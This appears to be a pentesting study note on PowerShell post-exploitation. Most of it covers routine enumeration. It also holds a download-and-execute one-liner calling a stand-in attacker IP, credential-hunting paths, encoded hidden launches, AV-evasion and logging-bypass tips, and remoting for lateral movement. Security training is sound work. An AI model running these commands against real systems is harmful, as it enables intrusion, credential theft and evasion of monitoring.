# PowerShell for Post-Exploitation

PowerShell is a powerful command-line shell and scripting language built into modern Windows systems. It provides extensive access to system internals, making it one of the most valuable tools for **post-exploitation**, **privilege escalation**, **reconnaissance**, and **lateral movement**.
## 1. Basics

Launch PowerShell:

```cmd
powershell
```

Run a one-liner:

```cmd
powershell -Command "Get-Process"
```

Suppress warnings/logs:

```powershell
powershell -nop -w hidden -ep bypass
```
## 2. Execution Policy Overview

> See the separate note: `ðŸŸ  6. Execution Policy.md` for full details.

Temporarily bypass policy:

```powershell
Set-ExecutionPolicy Bypass -Scope Process
```
## 3. Enumeration Techniques

### Get Local Users

```powershell
Get-LocalUser
```
### Get Group Membership

```powershell
Get-LocalGroupMember -Group "Administrators"
```
### Get Running Processes

```powershell
Get-Process
```
### List Scheduled Tasks

```powershell
Get-ScheduledTask
```
## 4. File and Registry Enumeration

```powershell
Get-ChildItem -Recurse C:\Users\
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
```
## 5. Credential Hunting

Look for stored credentials in files:

```powershell
Get-Content C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\
```

Or extract DPAPI credentials using:

```powershell
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Vault"
```
## 6. Download & Execute Remote Payloads

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://<attacker_ip>/script.ps1')
```

Encode commands to evade detection:

```powershell
powershell -EncodedCommand <base64 string>
```
## 7. Offensive Modules & Tools

|Tool|Purpose|
|---|---|
|PowerView|AD enumeration, user/group recon|
|PowerUp|Privilege escalation techniques|
|Nishang|Payloads, reverse shells, persistence|
|PowerSploit|Post-exploitation framework|
|Empire Modules|Full C2 support with PowerShell|
## 8. AV Evasion & Obfuscation

Use `Invoke-Obfuscation` or `PowerShellCrypter` to:

- Change variable names    
- Encode payloads
- Modify script structure

Avoid suspicious strings like `Invoke-Expression`, `DownloadString`, `IEX`, etc.
## 9. PowerShell Logging and Detection

Logging events to monitor:

| Log Source                               | Event ID   | Description                          |
| ---------------------------------------- | ---------- | ------------------------------------ |
| Windows PowerShell                       | 400, 403   | Engine state changes                 |
| Microsoft-Windows-PowerShell/Operational | 4103, 4104 | Script block execution (4104 is key) |

Bypassing logging:

- Use `System.Net.WebClient` instead of `Invoke-WebRequest`    
- EncodedCommand with `-w hidden -nop -ep bypass`
## 10. PowerShell Remoting

If enabled and allowed by firewall:

```powershell
Enter-PSSession -ComputerName <target> -Credential <user>
```

Can be used for **lateral movement** in domain environments.
